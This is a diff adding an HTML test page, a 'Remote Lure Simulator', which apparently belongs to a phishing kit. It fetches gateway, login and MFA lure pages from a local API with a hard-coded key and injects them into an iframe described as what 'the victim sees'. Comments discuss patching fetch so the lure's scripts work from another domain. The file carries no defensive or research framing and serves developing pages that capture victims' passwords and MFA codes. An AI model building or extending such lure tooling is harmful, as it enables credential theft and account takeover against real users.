@@ -1,0 +1,105 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Remote Lure (Test)</title>
+    <style>
+        body { font-family: monospace; background: #333; color: #fff; padding: 20px; }
+        .controls { background: #000; padding: 10px; border-bottom: 2px solid #555; position: sticky; top: 0; z-index: 9999; }
+        .preview-box { border: 1px dashed #777; margin-top: 20px; background: #fff; min-height: 500px; color: #000; position: relative; }
+        button { cursor: pointer; padding: 8px 16px; background: #007bff; border: none; color: white; border-radius: 4px; }
+        button:hover { background: #0056b3; }
+        input { padding: 8px; border-radius: 4px; border: 1px solid #ccc; width: 300px; }
+    </style>
+</head>
+<body>
+
+<div class="controls">
+    <h3>🧪 Remote Lure Simulator</h3>
+    <div>
+        <label>API Endpoint:</label>
+        <input type="text" id="apiBase" value="http://localhost:3000/eapi">
+    </div>
+    <br>
+    <div>
+        <label>Actions:</label>
+        <button onclick="loadPage('gateway')">1. Fetch Gateway</button>
+        <button onclick="loadPage('login')">2. Fetch Login</button>
+        <button onclick="loadPage('mfa')">3. Fetch MFA</button>
+        <button onclick="checkStatus()">Check Status</button>
+    </div>
+    <br>
+    <div id="logs" style="font-size: 12px; color: #aaa; max-height: 100px; overflow-y: auto;"></div>
+</div>
+
+<!-- This iframe simulates the "Page" that the victim sees. We inject HTML into it. -->
+<iframe id="lureFrame" class="preview-box" width="100%" height="800px" frameBorder="0"></iframe>
+
+<script>
+    const LOGS = document.getElementById('logs');
+    const API_KEY = 'key_dev_001'; // Matches src/eapi/config/apiKeys.js
+
+    function log(msg) {
+        LOGS.innerHTML = `<div>[${new Date().toLocaleTimeString()}] ${msg}</div>` + LOGS.innerHTML;
+        console.log(msg);
+    }
+
+    async function loadPage(type) {
+        const baseUrl = document.getElementById('apiBase').value;
+        const url = `${baseUrl}/pages?type=${type}`;
+        
+        log(`Fetching ${type} page...`);
+
+        try {
+            const res = await fetch(url, {
+                headers: { 
+                    'X-API-KEY': API_KEY,
+                    'Content-Type': 'application/json'
+                }
+            });
+            const data = await res.json();
+
+            if (data.success && data.html) {
+                log(`✅ Received ${data.html.length} chars of HTML`);
+                injectHtml(data.html);
+            } else {
+                log(`❌ Error: ${data.message}`);
+            }
+        } catch (e) {
+            log(`❌ Network Error: ${e.message}`);
+        }
+    }
+
+    async function checkStatus() {
+        const baseUrl = document.getElementById('apiBase').value;
+        try {
+            const res = await fetch(`${baseUrl}/status`, {
+                headers: { 'X-API-KEY': API_KEY }
+            });
+            const data = await res.json();
+            log(`📊 Status: ${JSON.stringify(data)}`);
+        } catch (e) {
+            log(`❌ Status Check Error: ${e.message}`);
+        }
+    }
+
+    function injectHtml(htmlContent) {
+        const frame = document.getElementById('lureFrame');
+        const doc = frame.contentWindow.document;
+        
+        doc.open();
+        doc.write(htmlContent);
+        doc.close();
+
+        // [CRITICAL] Monkey-patch the Fetch inside the iframe?
+        // In a real scenario, the generated HTML scripts point to `/api/...` (relative).
+        // Since this iframe is on localhost:3000 (likely), it works.
+        // If this file was on a different domain, we'd need to intercept fetch calls or Base URL.
+        log(`💉 HTML Injected into Iframe`);
+    }
+
+</script>
+
+</body>
+</html>
